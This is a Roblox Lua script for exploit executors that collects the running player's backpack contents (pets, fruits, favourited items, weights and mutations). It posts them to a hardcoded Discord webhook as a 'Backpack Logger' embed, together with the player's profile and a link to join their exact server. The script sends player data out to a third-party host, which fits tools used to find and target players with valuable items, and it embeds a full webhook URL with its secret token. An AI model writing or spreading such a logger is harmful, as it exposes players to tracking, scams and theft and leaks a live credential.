local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"

local mutationEmojis = {
    Overgrown = "🌿", Wet = "💧", Chilled = "❄️", Frozen = "🧊", Moonlit = "🌙",
    Pollinated = "🐝", Bloodlit = "🩸", Burnt = "🔥", Cooked = "🍳", HoneyGlazed = "🍯",
    Plasma = "⚡", Heavenly = "👼", Choc = "🍫", Zombified = "🧟", Molten = "🌋",
    Sundried = "☀️", Verdant = "🌱", Paradisal = "🏝️", Windstruck = "💨",
    Gold = "💰", Rainbow = "🌈", Shocked = "⚡", Celestial = "🌌", Twisted = "🌀",
    Voidtouched = "🌑", Meteoric = "☄️", Alienlike = "👽", Galactic = "🪐",
    Dawnbound = "🌻", Disco = "💃"
}

local function safeRequest(data)
    if request then
        return request(data)
    elseif syn and syn.request then
        return syn.request(data)
    elseif http and http.request then
        return http.request(data)
    else
        error("No supported request function found.")
    end
end

local function classifyTools()
    local pets, fruits = {}, {}
    for _, tool in ipairs(Backpack:GetChildren()) do
        local name = tool.Name
        if not string.find(string.lower(name), "seed") then
            if string.match(name, "^%[.-%]%s+%a+%s+%[.-%]") then
                table.insert(fruits, tool)
            elseif string.match(name, "^%a+%s+%[.-KG%]%s+%[Age%s+%d+%]") then
                table.insert(pets, tool.Name)
            end
        end
    end
    return pets, fruits
end

local function parseToolFruitInfo(toolName)
    local baseName = string.match(toolName, "%]%s+(.-)%s+%[") or toolName
    local weight = string.match(toolName, "%[(%d+%.?%d*kg)%]$") or "?"

    local modifiers = {}
    for mods in string.gmatch(toolName, "%[(.-)%]") do
        mods = string.match(mods, "^%s*(.-)%s*$")
        if not string.find(string.lower(mods), "kg") and not string.match(mods, "^%d") and mods ~= baseName then
            for mod in string.gmatch(mods, "[^,]+") do
                mod = string.match(mod, "^%s*(.-)%s*$")
                local emoji = mutationEmojis[mod] or ""
                if emoji ~= "" then
                    table.insert(modifiers, emoji)
                end
            end
        end
    end

    local modStr = (#modifiers > 0) and table.concat(modifiers, " ") or "-"
    return baseName, modStr, weight
end

local function parsePetInfo(petName)
    local weight = string.match(petName, "%[(%d+%.?%d*%s*[Kk][Gg])%]") or "-"
    local age = string.match(petName, "%[Age%s+(%d+)%]") or "-"
    local baseName = string.match(petName, "^(%a+)")
    return baseName or petName, weight, age
end

local function getFavoriteFruitsAndPets()
    local favNames = {}
    local favMutations = {}
    local favWeights = {}

    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:GetAttribute("d") == true then
            if string.match(tool.Name, "^%a+%s+%[.-[Kk][Gg]%]%s+%[Age%s+%d+%]") then
                local baseName, weight, age = parsePetInfo(tool.Name)
                table.insert(favNames, baseName)
                table.insert(favMutations, "[Age " .. age .. "]")
                table.insert(favWeights, "[" .. weight .. "]")
            else
                local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
                table.insert(favNames, baseName)
                table.insert(favMutations, modStr)
                table.insert(favWeights, "[" .. weight .. "]")
            end
        end
    end

    return favNames, favMutations, favWeights
end

local function parsePets(pets)
    local petNames = {}
    local petAges = {}
    local petWeights = {}

    for _, petName in ipairs(pets) do
        local baseName, weight, age = parsePetInfo(petName)
        table.insert(petNames, baseName)
        table.insert(petAges, "[Age " .. age .. "]")
        table.insert(petWeights, "[" .. weight .. "]")
    end

    return petNames, petAges, petWeights
end

local function sortFruitsAlphabetically(fruits)
    table.sort(fruits, function(a, b)
        local aName = string.match(a.Name, "%]%s+(.-)%s+%[") or a.Name
        local bName = string.match(b.Name, "%]%s+(.-)%s+%[") or b.Name
        return string.lower(aName) < string.lower(bName)
    end)
end

local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
    local userId = LocalPlayer.UserId
    local username = LocalPlayer.Name
    local allFields = {}

    -- P-E-T-S
    if #pets > 0 then
        table.insert(allFields, { name = "Pets", value = " ", inline = false })
        local petNames, petAges, petWeights = parsePets(pets)
        table.insert(allFields, {
            name = "🐾 Pets",
            value = "```\n" .. table.concat(petNames, "\n") .. "\n```",
            inline = true
        })
        table.insert(allFields, {
            name = "🧩 Age",
            value = "```\n" .. table.concat(petAges, "\n") .. "\n```",
            inline = true
        })
        table.insert(allFields, {
            name = "⚖️ Weight",
            value = "```\n" .. table.concat(petWeights, "\n") .. "\n```",
            inline = true
        })
    end

    -- F-R-U-I-T-S
    if #fruits > 0 then
        table.insert(allFields, { name = "Fruits", value = " ", inline = false })

        sortFruitsAlphabetically(fruits)
        local fruitNames, fruitMutations, fruitWeights = {}, {}, {}

        for _, tool in ipairs(fruits) do
            local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
            table.insert(fruitNames, baseName)
            table.insert(fruitMutations, modStr)
            table.insert(fruitWeights, "[" .. weight .. "]")
        end

        table.insert(allFields, {
            name = "🍑 Fruits",
            value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```",
            inline = true
        })
        table.insert(allFields, {
            name = "🧩 Mutation",
            value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```",
            inline = true
        })
        table.insert(allFields, {
            name = "⚖️ Weight",
            value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```",
            inline = true
        })
    end

    -- F-A-V-O-R-I-T-E-S
    if #favNames > 0 then
        table.insert(allFields, { name = "Favorites", value = " ", inline = false })
        table.insert(allFields, {
            name = "⭐ Favorites",
            value = "```\n" .. table.concat(favNames, "\n") .. "\n```",
            inline = true
        })
        table.insert(allFields, {
            name = "🧩 Mutation / Pet Age",
            value = "```\n" .. table.concat(favMods, "\n") .. "\n```",
            inline = true
        })
        table.insert(allFields, {
            name = "⚖️ Weight",
            value = "```\n" .. table.concat(favWeights, "\n") .. "\n```",
            inline = true
        })
    end

    local joinLink = string.format("__**[✅ Join Server](https://www.roblox.com/games/%s?jobId=%s)**__", game.PlaceId, game.JobId)

    -- Split fields into multiple embeds if needed
    local embeds = {}
    for i = 1, #allFields, 25 do
        local embedFields = {}
        for j = i, math.min(i + 24, #allFields) do
            table.insert(embedFields, allFields[j])
        end
        table.insert(embeds, {
            title = username .. "'s Backpack Inventory",
            url = "https://www.roblox.com/users/" .. userId .. "/profile",
            color = 0x00BFFF,
            description = joinLink,
            fields = embedFields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        })
    end

    local payload = {
        username = "Backpack Logger",
        embeds = embeds
    }

    local response = safeRequest({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })

    if response.StatusCode == 204 then
        warn("✅ Sent to Discord.")
    else
        warn("❌ Failed:", response.StatusCode, response.StatusMessage)
    end
end

task.wait(2)
local pets, fruits = classifyTools()
local favNames, favMods, favWeights = getFavoriteFruitsAndPets()
sendWebhook(pets, fruits, favNames, favMods, favWeights)
